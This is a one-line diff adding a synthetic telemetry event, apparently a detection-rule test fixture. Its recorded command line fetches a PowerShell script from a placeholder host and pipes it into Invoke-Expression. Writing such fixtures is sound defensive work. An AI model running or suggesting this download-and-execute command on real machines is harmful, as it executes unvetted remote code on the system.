@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"FileName":"cmd.exe","ProcessCommandLine":"cmd.exe /c Invoke-WebRequest https://example.invalid/run.ps1 | IEX"}}
